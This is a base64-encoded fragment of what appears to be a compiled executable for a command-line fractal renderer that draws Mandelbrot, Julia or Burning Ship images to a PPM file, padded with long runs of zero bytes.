AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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ZWVuIDAuNSBhbmQgMTAuMAoAZnJhY3RhbC5wcG0AAQAAABwAAAABAAAAIAAAAAAAAAAgAAAAAgAAAAAAAAI0NgAARAAAAEQAAADkPQAAAAAAAEQAAAAAAAAAAAAAAAAAAAADAAAADAAFACAAAwAAAAAAnAAAASQCAACEAgACTAYAAwEHAAQfDwAEAwAABAAAAAAAABCAAQAAAAAAEIACAAAAAAAQgAMAAAAAABCABAAAAAAAEIAFAAAAAAAQgAYAAAAAABCABwAAAAAAEIAIAAAAAAAQgAkAAAAAABCACgAAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA